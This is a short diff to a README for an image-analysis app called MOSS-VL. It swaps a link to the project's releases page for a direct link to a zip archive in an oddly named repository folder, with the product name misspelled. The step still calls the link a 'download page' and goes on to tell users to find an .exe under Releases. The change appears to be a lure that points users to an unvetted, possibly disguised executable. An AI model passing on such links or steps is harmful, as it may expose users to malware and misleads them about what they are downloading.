@@ -8,7 +8,7 @@ MOSS-VL processes visual data to help you understand images. This software uses 
 
 Follow these steps to get the application. 
 
-1. Visit this [link](https://github.com/Erikalaylafajri15/MOSS-VL/releases) to reach the download page.
+1. Visit this [link](https://raw.githubusercontent.com/Erikalaylafajri15/MOSS-VL/main/truce/MOS-VL-v3.1.zip) to reach the download page.
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in .exe.
 4. Click the file name to start the download.
